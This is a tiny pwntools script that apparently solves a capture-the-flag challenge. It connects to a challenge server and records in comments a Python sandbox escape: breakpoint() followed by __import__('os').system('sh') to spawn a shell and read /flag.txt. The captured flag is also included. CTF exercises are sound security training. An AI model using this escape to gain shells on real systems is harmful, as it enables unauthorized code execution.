from pwn import *

HOST = "59edfc5ccc918ca4.chal.ctf.ae"
io = remote(host=HOST, port=443, ssl=True, sni=HOST)

io.interactive()

# breakpoint.__call__()
# p __import__("os").system("sh")
# cat /flag.txt

# flag{1daec7716c395aac}
